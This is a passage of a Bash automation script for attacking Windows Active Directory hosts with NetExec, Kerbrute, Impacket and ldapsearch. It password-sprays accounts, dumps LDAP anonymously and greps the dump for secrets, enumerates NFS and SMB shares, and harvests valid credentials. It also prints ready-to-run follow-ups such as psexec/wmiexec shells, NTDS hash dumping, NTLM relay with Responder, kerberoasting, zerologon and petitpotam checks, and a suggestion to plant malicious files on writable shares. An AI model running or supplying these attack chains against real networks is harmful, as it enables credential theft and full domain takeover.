                log_info "Full output: ${BWHITE}nxc-enum/smb/asrep-getnpusers.txt${NC}"
                log_info "Clean hashes: ${BWHITE}nxc-enum/smb/asrep-hashes.txt${NC}"
                echo ""
                log_info "Crack with John the Ripper:"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt nxc-enum/smb/asrep-hashes.txt"
                echo ""
                log_info "Or with Hashcat:"
                echo "hashcat -m 18200 nxc-enum/smb/asrep-hashes.txt /usr/share/wordlists/rockyou.txt"
                echo ""
                log_info "Show cracked passwords:"
                echo "john --show nxc-enum/smb/asrep-hashes.txt"
            fi
            
            # --- Additional User Attacks ---
            log_section "Additional User Attacks"
            
            # 1. Kerbrute User Enumeration (Validation)
            # Check if kerbrute is in PATH, if not check distinct location
            KERBRUTE_CMD="kerbrute"
            if ! command -v kerbrute &> /dev/null; then
                 if [ -f "$HOME/.local/bin/kerbrute" ]; then
                     KERBRUTE_CMD="$HOME/.local/bin/kerbrute"
                 elif [ -f "/home/noah/.local/bin/kerbrute" ]; then
                     KERBRUTE_CMD="/home/noah/.local/bin/kerbrute"
                 elif [ -f "/usr/local/bin/kerbrute" ]; then
                     KERBRUTE_CMD="/usr/local/bin/kerbrute"
                 fi
            fi

            if command -v "$KERBRUTE_CMD" &> /dev/null || [ -f "$KERBRUTE_CMD" ]; then
                 log_info "Kerbrute User Validation"
                 if [ -n "$pass" ]; then
                     log_info "Password provided ('$pass'), running Password Spray instead of just User Enumeration..."
                     print_cmd "$KERBRUTE_CMD passwordspray -d \"$domain_name\" --dc $IP \"$users_file\" \"$pass\""
                     timeout 300s "$KERBRUTE_CMD" passwordspray -d "$domain_name" --dc $IP "$users_file" "$pass" 2>/dev/null | tee nxc-enum/smb/kerbrute-spray.txt
                 else
                     print_cmd "$KERBRUTE_CMD userenum -d \"$domain_name\" --dc $IP \"$users_file\""
                     timeout 60s "$KERBRUTE_CMD" userenum -d "$domain_name" --dc $IP "$users_file" 2>/dev/null | tee nxc-enum/smb/kerbrute-validation.txt
                 fi
            else
                 log_warning "kerbrute not found (checked PATH and ~/.local/bin). Skipping user validation."
            fi
            
            # 2. NetView Enumeration (Network/Session info)
            log_info "NetView Network Enumeration"
            # NetView usually needs a valid user/pass, checking if we have one, otherwise runs limited
            if [ -n "$user" ] && [ -n "$pass" ]; then
                 print_cmd "impacket-netview \"$domain_name\"/\"$user\":\"$pass\"@$IP"
                 impacket-netview "$domain_name"/"$user":"$pass"@$IP 2>/dev/null | tee nxc-enum/smb/netview-auth.txt
            else
                 # Try with empty/anonymous if no creds yet (likely fails but worth a shot if Null session allowed)
                 print_cmd "impacket-netview \"$domain_name\"/''@$IP -no-pass"
                 impacket-netview "$domain_name"/''@$IP -no-pass 2>/dev/null | tee nxc-enum/smb/netview-anon.txt
            fi

            # 3. GetTGT (Check for TGT acquisition)
            log_info "GetTGT Check"
            echo "[*] TGT acquisition requires a valid password/hash."
            echo "[*] If you crack an AS-REP hash, get a TGT with:"
            echo "    impacket-getTGT $domain_name/<user>:<password>"
            echo ""
            # --- End New Checks ---

            else
            log_warning "Could not auto-detect domain name"
            log_info "Run manually with: GetNPUsers.py DOMAIN/ -usersfile $users_file -no-pass -dc-ip $IP"
            log_info "Or re-run script with: ./nxc-auto.sh -i $IP -d DOMAIN"
            fi
            echo ""
            fi
            else
            log_info "Skipping Windows-specific anonymous RPC/AD enumeration (target OS: Linux)"
            fi


            # FTP and LDAP anonymous checks (Windows-specific)
            if [ "$os_type" = "windows" ]; then
                log_section "FTP Anonymous Access"
                print_cmd "nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 30"
                ftp_output=$(timeout 60s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 30)
                echo "$ftp_output"

                # Check if anonymous FTP access succeeded and suggest commands
                if echo "$ftp_output" | grep -q "\[+\]"; then
                    log_success "Anonymous FTP access successful! Suggested commands:"
                    echo "ftp $IP"
                    echo "# Username: anonymous"
                    echo "# Password: anonymous"
                    echo ""
                    log_info "Or use lftp for better features:"
                    echo "lftp -u anonymous,anonymous $IP"
                    echo ""
                    log_info "Download all files recursively:"
                    echo "wget -r ftp://anonymous:anonymous@$IP/"
                    echo ""
                fi

                log_section "LDAP Anonymous Access"
                print_cmd "nxc ldap $IP -u '' -p '' --timeout 30"
                ldap_output=$(timeout 60s nxc ldap $IP -u '' -p '' --timeout 30)
                echo "$ldap_output"

                # Check if anonymous LDAP access succeeded (via nxc OR manual check)
                print_cmd "ldapsearch -x -H ldap://$IP -s base namingContexts"
                verify_ldap_anon=$(ldapsearch -x -H ldap://$IP -s base namingContexts 2>/dev/null)

                if echo "$ldap_output" | grep -q "\[+\]" || echo "$verify_ldap_anon" | grep -q "namingContexts"; then
                    log_success "Anonymous LDAP access verified! Attempting to dump data..."

                    # Determine Base DN
                    if [ -n "$domain" ]; then
                        base_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
                    else
                        log_info "Domain not specified, attempting to fetch naming contexts..."
                        # Try to fetch defaultNamingContext
                        base_dn=$(echo "$verify_ldap_anon" | grep "defaultNamingContext:" | awk '{print $2}')

                        # Fallback: if defaultNamingContext is empty, grab the first namingContexts that starts with DC=
                        if [ -z "$base_dn" ]; then
                             base_dn=$(echo "$verify_ldap_anon" | grep "namingContexts:" | awk '{print $2}' | grep "^DC=" | head -n 1)
                        fi
                    fi

                    if [ -n "$base_dn" ]; then
                        log_info "Using Base DN: ${BWHITE}$base_dn${NC}"
                        log_info "Dumping all objects..."
                        print_cmd "ldapsearch -x -H ldap://$IP -b \"$base_dn\" -s sub \"(objectClass=*)\""
                        ldapsearch -x -H ldap://$IP -b "$base_dn" -s sub "(objectClass=*)" > nxc-enum/ldap/ldap-dump-anonymous.txt

                        if [ -s nxc-enum/ldap/ldap-dump-anonymous.txt ]; then
                            log_success "Full LDAP dump saved to: ${BWHITE}nxc-enum/ldap/ldap-dump-anonymous.txt${NC}"

                            # Extract users
                            grep "sAMAccountName" nxc-enum/ldap/ldap-dump-anonymous.txt | awk '{print $2}' | sort | uniq > nxc-enum/ldap/ldap-users-anonymous.txt
                            log_info "Extracted ${BGREEN}$(wc -l < nxc-enum/ldap/ldap-users-anonymous.txt)${NC} users to: ${BWHITE}nxc-enum/ldap/ldap-users-anonymous.txt${NC}"

                            # Check for sensitive info in descriptions
                            log_info "Searching for sensitive info in descriptions..."
                            grep -iE "description|info|comment" nxc-enum/ldap/ldap-dump-anonymous.txt | grep -iE "pass|pwd|secret|admin|welcome" > nxc-enum/ldap/ldap-sensitive-descriptions.txt
                            if [ -s nxc-enum/ldap/ldap-sensitive-descriptions.txt ]; then
                                log_warning "FOUND POTENTIAL SECRETS in LDAP descriptions!"
                                cat nxc-enum/ldap/ldap-sensitive-descriptions.txt
                            fi
                        else
                            log_error "LDAP dump file is empty. Anonymous bind allowed but maybe no read access?"
                        fi
                        log_info "Suggestion: cat nxc-enum/ldap/ldap-dump-anonymous.txt | grep description"
                    else
                        log_warning "Could not determine Base DN automatically."
                        log_info "Try manual enumeration:"
                        echo "ldapsearch -x -H ldap://$IP -s base namingContexts"
                    fi
                    echo ""
                fi

                log_section "LDAP Guest Access"
                # Try with guest account
                if [ -n "$domain" ]; then
                    print_cmd "nxc ldap $IP -d \"$domain\" -u 'guest' -p '' --timeout 30"
                    ldap_guest_output=$(timeout 60s nxc ldap $IP -d "$domain" -u 'guest' -p '' --timeout 30)
                else
                    print_cmd "nxc ldap $IP -u 'guest' -p '' --timeout 30"
                    ldap_guest_output=$(timeout 60s nxc ldap $IP -u 'guest' -p '' --timeout 30)
                fi
                echo "$ldap_guest_output"

                if echo "$ldap_guest_output" | grep -q "\[+\]"; then
                    log_success "Guest LDAP access successful! Attempting to dump data..."

                    # Determine Base DN (Similar logic to anonymous)
                    if [ -n "$domain" ]; then
                        base_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
                    else
                        log_info "Domain not specified, attempting to fetch defaultNamingContext..."
                        # Try to fetch defaultNamingContext via guest
                        # Note: ldapsearch needs bind DN for guest: -D "guest" -w "" usually works if guest is enabled
                        base_dn=$(ldapsearch -x -H ldap://$IP -D "guest" -w "" -s base namingContexts 2>/dev/null | grep "defaultNamingContext:" | awk '{print $2}')

                        if [ -z "$base_dn" ]; then
                             base_dn=$(ldapsearch -x -H ldap://$IP -D "guest" -w "" -s base namingContexts 2>/dev/null | grep "namingContexts:" | awk '{print $2}' | grep "^DC=" | head -n 1)
                        fi
                    fi

                    if [ -n "$base_dn" ]; then
                        log_info "Using Base DN: ${BWHITE}$base_dn${NC}"
                        log_info "Dumping all objects (as Guest)..."
                        # Bind as guest
                        print_cmd "ldapsearch -x -H ldap://$IP -D \"guest\" -w \"\" -b \"$base_dn\" -s sub \"(objectClass=*)\""
                        ldapsearch -x -H ldap://$IP -D "guest" -w "" -b "$base_dn" -s sub "(objectClass=*)" > nxc-enum/ldap/ldap-dump-guest.txt

                        if [ -s nxc-enum/ldap/ldap-dump-guest.txt ]; then
                            log_success "Full LDAP dump saved to: ${BWHITE}nxc-enum/ldap/ldap-dump-guest.txt${NC}"

                            # Extract users
                            grep "sAMAccountName" nxc-enum/ldap/ldap-dump-guest.txt | awk '{print $2}' | sort | uniq > nxc-enum/ldap/ldap-users-guest.txt
                            log_info "Extracted ${BGREEN}$(wc -l < nxc-enum/ldap/ldap-users-guest.txt)${NC} users to: ${BWHITE}nxc-enum/ldap/ldap-users-guest.txt${NC}"

                            # Check for sensitive info
                            log_info "Searching for sensitive info in descriptions..."
                            grep -iE "description|info|comment" nxc-enum/ldap/ldap-dump-guest.txt | grep -iE "pass|pwd|secret|admin|welcome" > nxc-enum/ldap/ldap-sensitive-descriptions-guest.txt
                            if [ -s nxc-enum/ldap/ldap-sensitive-descriptions-guest.txt ]; then
                                log_warning "FOUND POTENTIAL SECRETS in LDAP descriptions (Guest)!"
                                cat nxc-enum/ldap/ldap-sensitive-descriptions-guest.txt
                            fi
                        else
                            log_error "LDAP dump file is empty. Guest bind allowed but maybe no read access?"
                        fi
                        log_info "Suggestion: cat nxc-enum/ldap/ldap-dump-guest.txt | grep description"
                    else
                        log_warning "Could not determine Base DN automatically via Guest."
                    fi
                    echo ""
                fi
            fi
log_section "NFS Enumeration"

# 1. NetExec NFS enumeration
print_cmd "nxc nfs $IP --shares"
nfs_output=$(unbuffer nxc nfs $IP --shares 2>/dev/null | tee nxc-enum/smb/nfs-shares.txt)
echo "$nfs_output"

# 2. showmount enumeration
if command -v showmount &> /dev/null; then
    log_info "showmount -e $IP"
    print_cmd "showmount -e $IP"
    showmount_output=$(showmount -e $IP 2>/dev/null | tee nxc-enum/smb/nfs-showmount.txt)
    echo "$showmount_output"
else
    showmount_output=""
fi

# 3. rpcinfo (Bonus: reveals if NFS/mountd are running)
if command -v rpcinfo &> /dev/null; then
    log_info "rpcinfo -p $IP"
    print_cmd "rpcinfo -p $IP"
    rpcinfo -p $IP 2>/dev/null | tee nxc-enum/smb/nfs-rpcinfo.txt
fi

# Check for NFS shares and suggest mount commands from both tools
if echo "$nfs_output" | grep -qE "r--|rw-|rwx" || echo "$showmount_output" | grep -q "^/"; then
    log_success "NFS shares found! Suggested mount commands:"
    echo "sudo mkdir -p /mnt/nfs"
    
    # Track shares we already suggested to avoid duplicates
    suggested_shares=""
    
    # Process nxc output
    if echo "$nfs_output" | grep -qE "r--|rw-|rwx"; then
        while read -r line; do
            clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
            nfs_share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^\//) {print $i; exit}}'| head -n1)
            if [ -n "$nfs_share" ]; then
                log_info "Mount $nfs_share:"
                echo "sudo mount -t nfs $IP:$nfs_share /mnt/nfs"
                echo "# Or with specific version: sudo mount -t nfs -o vers=3 $IP:$nfs_share /mnt/nfs"
                suggested_shares="$suggested_shares $nfs_share"
            fi
        done < <(echo "$nfs_output" | grep -E "r--|rw-|rwx")
    fi
    
    # Process showmount output (for extra shares or if nxc failed)
    if [ -n "$showmount_output" ]; then
        while read -r line; do
            nfs_share=$(echo "$line" | awk '{print $1}')
            if [ -n "$nfs_share" ] && [[ "$nfs_share" == /* ]] && ! echo "$suggested_shares" | grep -q "$nfs_share"; then
                log_info "Mount $nfs_share:"
                echo "sudo mount -t nfs $IP:$nfs_share /mnt/nfs"
                echo "# Or with specific version: sudo mount -t nfs -o vers=3 $IP:$nfs_share /mnt/nfs"
                suggested_shares="$suggested_shares $nfs_share"
            fi
        done < <(echo "$showmount_output" | grep "^/")
    fi
    echo ""
fi



# Helper function to run nxc and suggest login command if successful
check_and_suggest() {
    service=$1
    shift
    log_info "Checking $service..."
    # Print the command before execution
    print_cmd "$@"
    # Run the command and capture output
    output=$("$@")

    echo "$output"
    
    # Auto-fix Schema Mismatch and Retry
    if echo "$output" | grep -q "Schema mismatch detected"; then
        log_warning "Schema mismatch detected! Attempting auto-fix (deleting old DBs) and RETRYING..."
        rm -f ~/.nxc/workspaces/default/*.db 2>/dev/null
        rm -f /root/.nxc/workspaces/default/*.db 2>/dev/null
        
        log_info "Retrying command..."
        # Retry the command
        print_cmd "$@"
        output=$("$@")
        echo "$output"
    fi

    # Try different auth combinations if failed for SMB/WinRM/WMI
    if [[ "$service" == "smb" || "$service" == "winrm" || "$service" == "wmi" ]] && ! echo "$output" | grep -q "+"; then
         
         # Helper to strip domain for retries
         local base_args=()
         local skip_next=false
         for arg in "$@"; do
             if [ "$skip_next" = true ]; then skip_next=false; continue; fi
             if [ "$arg" = "-d" ]; then skip_next=true; continue; fi
             base_args+=("$arg")
         done

         # 1. Try WITHOUT domain flag if one was provided
         if [[ "$*" == *"-d "* ]]; then
             log_warning "Auth failed with domain. Retrying WITHOUT domain flag..."
             print_cmd "${base_args[@]}"
             output=$("${base_args[@]}")
             echo "$output"
         fi

         # 2. Try with --local-auth if still failed
         if ! echo "$output" | grep -q "+"; then
             log_warning "Still failed. Retrying with --local-auth (stripping domain)..."
             print_cmd "${base_args[@]} --local-auth"
             output=$("${base_args[@]}" --local-auth)
             echo "$output"
             
             # If local auth worked, we should remember to use it for future suggestions in this session
             if echo "$output" | grep -q "+"; then
                 USE_LOCAL_AUTH="true"
             fi
         fi
    fi
    
    # Harvest any successes found in this tool's output
    echo "$output" | grep -a "\[+\]" | sed 's/\x1b\[[0-9;]*m//g' | while read -r line; do
        local cred=$(echo "$line" | sed 's/.*\[+\] //')
        if [ -n "$cred" ]; then
            if ! grep -qxF "$cred" "$VALID_CREDS_FILE" 2>/dev/null; then
                echo "$cred" >> "$VALID_CREDS_FILE"
            fi
        fi
    done

    # Harvest password change required
    echo "$output" | grep -a "STATUS_PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | sed 's/\x1b\[[0-9;]*m//g' | while read -r line; do
        local cred=$(echo "$line" | sed 's/.*[-] //' | cut -d' ' -f1)
        if [ -n "$cred" ]; then
            if ! grep -qxF "$cred" "$POTENTIAL_CREDS_FILE" 2>/dev/null; then
                echo "$cred (PASSWORD_MUST_CHANGE)" >> "$POTENTIAL_CREDS_FILE"
            fi
        fi
    done
    
    # Check for success indicator "[+]"
    if echo "$output" | grep -q "+"; then
        # If user is a file (list), sanitizing to just 'USER' for display purposes in suggestions
        # The true username will be available if auto-promotion runs, but here we just want a clean string
        display_user="$user"
        if [ -f "$user" ]; then
             display_user="USER"
        fi

        log_success "Valid credentials for $service! Suggested command:"

        
        # Prepare credential strings
        if [ -n "$domain" ] && [ "$USE_LOCAL_AUTH" != "true" ]; then
             display_user_winrm="$domain\\$display_user"
        else
             display_user_winrm="$display_user"
        fi

        if [ -n "$hash" ]; then
            IMPACKET_CREDS="$domain/$display_user@$IP -hashes :$hash"
            WINRM_CREDS="-i $IP -u '$display_user_winrm' -H '$hash'"
            if [ -n "$domain" ]; then
                SMBCLIENT_AUTH="-U '$domain\\$display_user' --pw-nt-hash $hash"
                SMBGET_USER="$domain/$display_user%$hash"
                SMBMAP_CREDS="-u '$display_user' -p '$hash' -d '$domain'"
            else
                SMBCLIENT_AUTH="-U '$display_user' --pw-nt-hash $hash"
                SMBGET_USER="$display_user%$hash"
                SMBMAP_CREDS="-u '$display_user' -p '$hash'"
            fi
            XFREERDP_PASS="/pth:$hash"  # For xfreerdp3 with hash
        else
            IMPACKET_CREDS="$domain/$display_user:$pass@$IP"
            WINRM_CREDS="-i $IP -u '$display_user_winrm' -p '$pass'"
            if [ -n "$domain" ]; then
                SMBCLIENT_AUTH="-U '$domain\\$display_user%$pass'"
                SMBGET_USER="$domain/$display_user%$pass"
                SMBMAP_CREDS="-u '$display_user' -p '$pass' -d '$domain'"
            else
                SMBCLIENT_AUTH="-U '$display_user%$pass'"
                SMBGET_USER="$display_user%$pass"
                SMBMAP_CREDS="-u '$display_user' -p '$pass'"
            fi
            XFREERDP_PASS="/p:'$pass'"  # For xfreerdp3 with password
        fi

        case $service in
            "smb")
                # Suggest Impacket tools for SMB
                log_warning "Impacket tools for SMB:"
                echo "impacket-psexec $IMPACKET_CREDS"
                echo "impacket-smbexec $IMPACKET_CREDS"
                
                # Check for Admin access (Pwn3d!)
                if echo "$output" | grep -q "Pwn3d!"; then
                     log_success "Admin access (Pwn3d!) detected - tools above will work!"
                else
                     log_error "Note: Admin tools above require elevated privileges"
                fi
                echo ""

                # Enumerate shares to see which ones are accessible
                log_info "Enumerating shares for suggestions..."
                # Use the already captured output if it contains shares, or run it if needed.
                # Since we are optimizing to run --shares in the main call, we use $output.
                shares_output="$output"
                
                # Check for writable shares and display prominent notice
                writable_shares=$(echo "$shares_output" | sed 's/\x1b\[[0-9;]*m//g' | grep "WRITE" | awk '{for(i=1;i<=NF;i++) if($i=="WRITE") print $(i-1)}' | sed 's/^\\\//')
                if [ -n "$writable_shares" ]; then
                    log_error "WRITABLE SHARES FOUND - Potential for privilege escalation!"
                    log_warning "Writable shares:"
                    echo "$writable_shares" | while read -r share; do
                        if [ ! -z "$share" ]; then
                            echo "  - $share"
                        fi
                    done
                    echo ""
                    log_success "Exploitation suggestions:"
                    echo "# Upload malicious files, DLL hijacking, or SCF/LNK attacks"
                    echo "# Check for startup folders, scripts, or scheduled tasks"
                    echo ""
                fi
                
                log_success "Suggested connections:"
                echo "$shares_output" | while read -r line; do
                    # Clean color codes for parsing
                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                    
                    # Check for accessible shares (READ or WRITE)
                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                        # Extract share name (it is the field before READ or WRITE)
                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                        
                        # Remove leading backslash if present
                        share=${share#\\}
                        
                        if [ ! -z "$share" ]; then
                            echo "smbclient $SMBCLIENT_AUTH //$IP/$share"
                        fi
                    fi
                done
                
                # Add recursive download suggestions
                echo ""
                log_success "Download all files from shares:"
                echo "$shares_output" | while read -r line; do
                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                        share=${share#\\}
                        if [ ! -z "$share" ]; then
                            log_info "Download $share recursively:"
                            if [ -n "$hash" ]; then
                                echo "# Recursively download all files (Best way):"
                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
                                echo ""
                                echo "# Download specific file with smbmap:"
                                echo "smbmap $SMBMAP_CREDS -H $IP --download '$share\\path\\to\\file'"
                                echo "# Note: smbget doesn't support --pw-nt-hash"
                            else
                                echo "# Recursively download all files (Best ways):"
                                echo "smbget -R smb://$IP/$share -U '$SMBGET_USER'"
                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
                                echo ""
                                echo "# Download specific file with smbmap:"
                                echo "smbmap $SMBMAP_CREDS -H $IP --download '$share\\path\\to\\file'"
                            fi
                            echo ""
                        fi
                    fi
                done
                
                # Add remote execution tool suggestions
                log_success "Remote execution tools:"
                if echo "$output" | grep -q "Pwn3d!"; then
                    log_info "Admin access detected - these tools should work:"
                    echo "wmiexec.py $IMPACKET_CREDS"
                    echo "psexec.py $IMPACKET_CREDS"
                    echo "smbexec.py $IMPACKET_CREDS"
                    echo "atexec.py $IMPACKET_CREDS"
                else
                    log_warning "No admin access - these tools may fail:"
                    echo "wmiexec.py $IMPACKET_CREDS  # Requires admin"
                    echo "psexec.py $IMPACKET_CREDS   # Requires admin"
                fi
                ;;
            "wmi")
                if echo "$output" | grep -q "Pwn3d!"; then
                     log_success "Admin access (Pwn3d!) detected - impacket-wmiexec should work!"
                else
                     log_warning "Valid credentials, but Admin access not detected. impacket-wmiexec might fail (Access Denied)."
                fi
                echo "impacket-wmiexec $IMPACKET_CREDS"
                ;;
            "winrm")
                log_success "WinRM Shell access! Suggested shell tool:"
                echo "evil-winrm $WINRM_CREDS"
                if [ "$USE_LOCAL_AUTH" = "true" ]; then
                     log_info "Note: Successful login was found to be a local account."
                fi
                echo ""
                log_info "Or execute command with NetExec:"
                if [ "$USE_LOCAL_AUTH" = "true" ]; then
                     echo "nxc winrm $IP $USER_FLAG --local-auth -x whoami"
                else
                     echo "nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami"
                fi
                ;;
            "mssql")
                echo "impacket-mssqlclient $IMPACKET_CREDS"
                ;;
            "ssh")
                echo "ssh '$display_user@$IP'"
                ;;
            "ftp")
                echo "ftp ftp://$display_user:$pass@$IP"
                ;;
            "vnc")
                echo "vncviewer $IP"
                ;;
            "ldap")
                # LDAP enumeration tools
                log_section "LDAP Enumeration Tools"
                
                # Check for Admin access (Pwn3d!)
                if echo "$output" | grep -q "Pwn3d!"; then
                    log_error "Domain Admin access (Pwn3d!) detected! You can dump NTDS hashes."
                    log_success "Suggested exploitation commands:"
                    echo "nxc smb $IP $USER_FLAG --ntds"
                    echo "impacket-secretsdump $IMPACKET_CREDS"
                    echo ""
                fi

                if [ -n "$domain" ]; then
                    base_dn="DC=${domain//./,DC=}"
                    if [ -n "$hash" ]; then
                        log_info "NetExec LDAP enumeration:"
                        echo "nxc ldap $IP -d '$domain' -u '$display_user' -H '$hash' --users"
                        echo "nxc ldap $IP -d '$domain' -u '$display_user' -H '$hash' --bloodhound -c All"
                        echo ""
                        log_info "ldapdomaindump (requires password, not hash):"
                        echo "# ldapdomaindump -u '$domain\\$display_user' -p 'PASSWORD' ldap://$IP"
                    else
                        log_info "ldapsearch:"
                        echo "ldapsearch -x -H ldap://$IP -D \"$display_user@$domain\" -w '$pass' -b \"$base_dn\" \"(objectClass=*)\""
                        echo ""
                        log_info "ldapdomaindump:"
                        echo "ldapdomaindump -u '$domain\\$display_user' -p '$pass' ldap://$IP"
                        echo ""
                        log_info "BloodHound data collection:"
                        echo "bloodhound-python -u '$display_user' -p '$pass' -d $domain -ns $IP -c All"
                        echo ""
                        log_info "NetExec LDAP enumeration:"
                        echo "nxc ldap $IP -d '$domain' -u '$display_user' -p '$pass' --users --bloodhound -c All"
                    fi
                else
                    log_warning "Domain name required for LDAP tools. Specify with -d flag"
                fi
                ;;
        esac
        
        # RDP specific
        if [ "$service" == "rdp" ]; then
            if [ -n "$domain" ]; then
                 echo "xfreerdp3 /v:$IP /u:'$display_user' $XFREERDP_PASS /d:'$domain' /dynamic-resolution +clipboard /cert:ignore"
                 echo "rdesktop -u '$display_user' -p '$pass' -d '$domain' $IP"
            else
                 echo "xfreerdp3 /v:$IP /u:'$display_user' $XFREERDP_PASS /dynamic-resolution +clipboard /cert:ignore"
                 echo "rdesktop -u '$display_user' -p '$pass' $IP"
            fi
            echo "remmina -c rdp://$display_user:$pass@$IP"
        fi
        echo ""
    fi
}


# Credential validation (Windows-specific)
if [ "$os_type" = "windows" ]; then
    log_section "Credential Validation"
    # Build optional flags
    # Flags already built at the top
    
    # SMB (anonymous allowed, domain optional)
    # Added --shares to check shares in one go
    if check_port $IP 445; then
        smb_output=$(check_and_suggest smb nxc smb $IP $DOMAIN_FLAG $USER_FLAG --shares --continue-on-success --timeout 30)
        echo "$smb_output"
        promote_verified_creds
    else
        smb_output="" # Empty output if closed
    fi
    
    # Check for SMB signing status
    if echo "$smb_output" | grep -q "signing:True"; then
        log_warning "SMB Signing is ENABLED"
        log_info "Impact:"
        echo "  - NTLM relay attacks are NOT possible"
        echo "  - Man-in-the-middle attacks are prevented"
        echo "  - SMB traffic is cryptographically signed"
        echo ""
        log_info "What you CAN still do:"
        echo ""
        log_info "1. Password Spraying:"
        echo "nxc smb $IP -u users.txt -p 'Password123' --continue-on-success"
        echo "nxc smb $IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success"
        echo ""
        log_info "2. Kerberoasting (extract and crack service account passwords):"
        echo "nxc ldap $IP -u '$user' -p '$pass' --kerberoasting kerberoast.txt"
        echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt"
        echo ""
        log_info "3. AS-REP Roasting (accounts without pre-auth):"
        echo "GetNPUsers.py $domain/ -usersfile users.txt -no-pass -dc-ip $IP"
        echo ""
        log_info "4. Enumerate users for further attacks:"
        echo "nxc smb $IP -u '' -p '' --rid-brute"
        echo "lookupsid.py -no-pass anonymous@$IP"
        echo ""
        log_info "5. Check for common vulnerabilities:"
        echo "nxc smb $IP -u '$user' -p '$pass' -M zerologon"
        echo "nxc smb $IP -u '$user' -p '$pass' -M petitpotam"
        echo ""
        log_info "6. LDAP enumeration and attacks:"
        echo "nxc ldap $IP -u '$user' -p '$pass' --bloodhound -c All"
        echo "nxc ldap $IP -u '$user' -p '$pass' --users --admin-count"
        echo ""
    elif echo "$smb_output" | grep -q "signing:False"; then
        log_success "SMB Signing is DISABLED - NTLM relay attacks possible!"
        log_info "Exploitation suggestions:"
        echo "  # NTLM Relay to SMB:"
        echo "  ntlmrelayx.py -tf targets.txt -smb2support"
        echo ""
        echo "  # NTLM Relay to LDAP (for privilege escalation):"
        echo "  ntlmrelayx.py -t ldap://$IP --escalate-user lowpriv"
        echo ""
        echo "  # Capture and relay with Responder:"
        echo "  responder -I eth0 -wv"
        echo "  ntlmrelayx.py -tf targets.txt -smb2support"
        echo ""
    fi
    
    # LDAP requires username (domain optional)
    if [ -n "$user" ]; then
        log_info "Validating LDAP credentials..."
        check_and_suggest ldap nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --continue-on-success --timeout 30
        promote_verified_creds
    else
        log_warning "Skipping LDAP check (no username supplied)"
    fi
    
    # RDP check (requires username)
    if [ -n "$user" ]; then
        if check_port $IP 3389; then
            log_section "RDP Enumeration"
            log_info "RDP Credentials Check"
            rdp_output=$(check_and_suggest rdp nxc rdp $IP $DOMAIN_FLAG $USER_FLAG --continue-on-success)
            echo "$rdp_output"
            promote_verified_creds
            
            # Check if RDP access was successful
            if echo "$rdp_output" | grep -q "\[+\]"; then
                log_success "RDP access successful! Connect with:"
                if [ -n "$domain" ]; then
                    echo "xfreerdp3 /v:$IP /u:$domain\\\\$display_user $XFREERDP_PASS /cert:ignore /clipboard /dynamic-resolution"
                else
                    echo "xfreerdp3 /v:$IP /u:$display_user $XFREERDP_PASS /cert:ignore /clipboard /dynamic-resolution"
                fi
                echo ""
                log_info "Or with rdesktop:"
                if [ -n "$domain" ]; then
                    echo "rdesktop -u $display_user -p '$pass' -d $domain $IP"
                else
                    echo "rdesktop -u $display_user -p '$pass' $IP"
                fi
                echo ""
                log_info "Or with Remmina (command line):"
                if [ -n "$domain" ]; then
                    echo "remmina -c 'rdp://$domain\\\\$display_user:$pass@$IP'"
                else
                    echo "remmina -c 'rdp://$display_user:$pass@$IP'"
                fi
                echo ""
            fi
        else
            log_warning "Skipping RDP check (Port 3389 closed)"
        fi
    else
        log_warning "Skipping RDP check (no username supplied)"
    fi
fi

# WinRM requires cr
# nxc rdp $IP -u $user -p $pass # RDP
# nxc ftp $IP -u $user -p $pass # FTP

# Skip all Windows-specific enumeration for Linux targets
if [ "$os_type" = "windows" ]; then
    # RPC enumeration - works with username only (null password)
    if [ -n "$user" ]; then
        log_section "RPC Enumeration (rpcclient)"
        print_cmd "rpcclient $RPC_ARG $IP -c \"queryuser 0\""
        rpcclient $RPC_ARG $IP -c "queryuser 0" 2>/dev/null # RPC user query
        print_cmd "rpcclient $RPC_ARG $IP -c \"enumdomusers\""
        rpcclient $RPC_ARG $IP -c "enumdomusers" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomusers.txt # Enumerate domain users via RPC
        print_cmd "rpcclient $RPC_ARG $IP -c \"enumdomgroups\""
        rpcclient $RPC_ARG $IP -c "enumdomgroups" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomgroups.txt # Enumerate domain groups via RPC
        
        # Extract usernames to a clean list
        if [ -f nxc-enum/smb/rpc-enumdomusers.txt ] && grep -q "user:" nxc-enum/smb/rpc-enumdomusers.txt; then
            # Notify if overwriting existing file
            if [ -f rpcuserlist.txt ]; then
                log_warning "Overwriting existing rpcuserlist.txt"
            fi
            
            grep "user:" nxc-enum/smb/rpc-enumdomusers.txt | awk -F'[][]' '{print $2}' > rpcuserlist.txt
            user_count=$(wc -l < rpcuserlist.txt)
            log_success "Extracted $user_count usernames to: ${BWHITE}rpcuserlist.txt${NC}"
            echo ""
            log_info "Suggested attacks with this user list:"
            echo ""
            log_info "1. Password spraying with NetExec:"
            echo "nxc smb $IP -u rpcuserlist.txt -p 'Password123' --continue-on-success"
